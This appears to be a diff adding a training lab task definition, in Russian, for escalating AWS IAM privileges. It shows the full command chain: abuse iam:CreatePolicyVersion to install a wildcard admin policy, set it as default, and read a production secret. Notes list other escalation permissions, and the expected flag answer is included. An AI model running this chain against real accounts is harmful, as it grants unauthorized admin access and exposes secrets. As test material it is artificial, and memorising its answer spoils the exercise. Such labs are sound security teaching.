@@ -1,0 +1,62 @@
+{
+  "id": "cloud-privesc-iam",
+  "workdir": "/home/student/privesc",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/privesc/found.txt",
+    "contains": "nto{cr34t3_p0l1cy_v3rs10n_t0_4dm1n}"
+  },
+  "fs": [
+    { "path": "/home/student/privesc", "type": "dir" },
+    {
+      "path": "/home/student/privesc/task.md",
+      "text": "# Задача: одно «лишнее» право = админ\n\nУ тебя есть ключ пользователя `intern-bot` с «обычными» правами.\nРазберись, какое право в его политике позволяет повысить привилегии,\nи доведи цепочку до секрета.\n\nИнструмент: `aws` (эмуляция — ответы захвачены с реального аккаунта).\n\nШаги:\n1. `aws iam list-attached-user-policies --user-name intern-bot` — какие политики.\n2. `aws iam get-policy-version ...` — прочитай документ и найди опасное право.\n3. Создай новую «админскую» версию политики (см. `admin.json`) и сделай её основной.\n4. Прочитай секрет: `aws secretsmanager get-secret-value --secret-id prod/flag`.\n5. Запиши флаг в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/privesc/notes.md",
+      "text": "Заметки\n------\n- iam:CreatePolicyVersion позволяет переписать политику, которая на тебя же и влияет.\n- Другие пути эскалации: iam:AttachUserPolicy, iam:AttachRolePolicy, iam:PassRole, iam:CreateAccessKey, iam:PutUserPolicy, sts:AssumeRole на '*'.\n- Политику пишут как JSON-документ, версию делают default флагом --set-as-default.\n"
+    },
+    {
+      "path": "/home/student/privesc/ReadOnlyPlus.json",
+      "text": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    { \"Effect\": \"Allow\", \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"], \"Resource\": \"*\" },\n    { \"Effect\": \"Allow\", \"Action\": [\"iam:CreatePolicyVersion\"], \"Resource\": \"*\" }\n  ]\n}\n"
+    },
+    {
+      "path": "/home/student/privesc/admin.json",
+      "text": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" } ]\n}\n"
+    }
+  ],
+  "tools": {
+    "aws": {
+      "help": "aws <service> <operation> [...] — AWS CLI (эмуляция: ответы захвачены с реального аккаунта)",
+      "cases": [
+        {
+          "match": "iam list-attached-user-policies",
+          "example": "aws iam list-attached-user-policies --user-name intern-bot",
+          "output": "{\n  \"AttachedPolicies\": [\n    { \"PolicyName\": \"ReadOnlyPlus\", \"PolicyArn\": \"arn:aws:iam::123456789012:policy/ReadOnlyPlus\" }\n  ]\n}\n"
+        },
+        {
+          "match": "iam get-policy-version",
+          "example": "aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/ReadOnlyPlus --version-id v1",
+          "output": "{\n  \"PolicyVersion\": {\n    \"VersionId\": \"v1\",\n    \"IsDefaultVersion\": true,\n    \"Document\": {\n      \"Version\": \"2012-10-17\",\n      \"Statement\": [\n        { \"Effect\": \"Allow\", \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"], \"Resource\": \"*\" },\n        { \"Effect\": \"Allow\", \"Action\": [\"iam:CreatePolicyVersion\"], \"Resource\": \"*\" }\n      ]\n    }\n  }\n}\n"
+        },
+        {
+          "match": "iam create-policy-version",
+          "example": "aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/ReadOnlyPlus --policy-document file://admin.json --set-as-default",
+          "output": "{\n    \"PolicyVersion\": { \"VersionId\": \"v2\", \"IsDefaultVersion\": true }\n}\n"
+        },
+        {
+          "match": "iam list-users",
+          "example": "aws iam list-users",
+          "output": "{\n    \"Users\": [\n        { \"UserName\": \"admin\" },\n        { \"UserName\": \"deploy-bot\" },\n        { \"UserName\": \"intern-bot\" }\n    ]\n}\n"
+        },
+        {
+          "match": "secretsmanager get-secret-value",
+          "example": "aws secretsmanager get-secret-value --secret-id prod/flag",
+          "output": "{\n    \"Name\": \"prod/flag\",\n    \"SecretString\": \"nto{cr34t3_p0l1cy_v3rs10n_t0_4dm1n}\"\n}\n"
+        }
+      ],
+      "fallback": "aws: (эмуляция) такой вызов не захвачен. Попробуй: aws iam list-attached-user-policies --user-name intern-bot | aws iam get-policy-version ... | aws secretsmanager get-secret-value --secret-id prod/flag\n"
+    }
+  }
+}
